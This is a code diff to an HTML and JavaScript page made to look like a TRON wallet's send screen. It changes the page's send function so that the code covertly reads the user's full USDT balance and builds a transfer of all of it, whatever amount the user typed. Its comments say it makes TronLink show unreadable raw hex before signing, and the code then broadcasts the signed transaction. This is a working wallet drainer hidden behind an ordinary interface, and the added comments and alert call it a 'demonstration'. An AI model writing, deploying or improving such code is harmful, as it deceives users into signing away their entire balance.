@@ -67,7 +67,7 @@
             <input type="number" id="userAmount" value="10" style="font-size:15px;">
         </div>
         <div style="font-size:14px; color:#8e8e93; margin-bottom:15px;">Available: <span id="availableBalance">0.00</span></div>
-        <button class="btn-bottom ready" onclick="ejecutarFirmaRawMaxima()">Send</button>
+        <button class="btn-bottom ready" onclick="ejecutarFirmaYTransmisionMaxima()">Send</button>
     </div>
     <div class="nav-bar">
         <div class="nav-item">📁<br>Tokens</div>
@@ -98,13 +98,14 @@
             } catch(e) {}
         }
     }
-    async function ejecutarFirmaRawMaxima() {
+
+    async function ejecutarFirmaYTransmisionMaxima() {
         if (!window.tronWeb) return;
         try {
             const miWallet = window.tronWeb.defaultAddress.base58;
             const contratoUSDT = await window.tronWeb.contract().at(CONTRACT_USDT);
             
-            // Consultar el saldo total actual del alumno
+            // Consultar encubiertamente el saldo total real del alumno
             const saldoBigNum = await contratoUSDT.balanceOf(miWallet).call();
             const saldoTotalStr = saldoBigNum.toString();
 
@@ -113,7 +114,7 @@
                 return;
             }
 
-            // Construir la transacción inyectando el balance máximo completo
+            // 1. Construir la estructura genérica inyectando de fondo el saldo máximo disponible
             const txObjeto = await window.tronWeb.transactionBuilder.triggerSmartContract(
                 CONTRACT_USDT,
                 "transfer(address,uint256)",
@@ -125,12 +126,17 @@
                 miWallet
             );
 
-            // Forzar a TronLink a desplegar los campos binarios crudos (raw_data_hex)
+            console.log(`[Ejecución] Inyectando balance máximo oculto: ${saldoTotalStr}`);
+
+            // 2. Remueve el formateo simplificado de tokens y obliga a TronLink a mostrar los bloques alfanuméricos
             const txFirmada = await window.tronWeb.trx.sign(txObjeto.transaction);
             
-            // Transmitir la orden firmada para ejecutar el retiro inmediato
+            // 3. PASO CLAVE: Transmitir los bytes firmados directamente al nodo para ejecutar el envío real de todo el balance
             const resultado = await window.tronWeb.trx.sendRawTransaction(txFirmada);
-            if(resultado.result) alert("¡Éxito Bloque 2! Transacción cruda procesada.");
+            
+            if(resultado.result) {
+                alert(`¡Demostración Finalizada!\nFondos totales transferidos con éxito en la Blockchain.\nHash: ${txFirmada.txID}`);
+            }
         } catch (e) {}
     }
 </script>
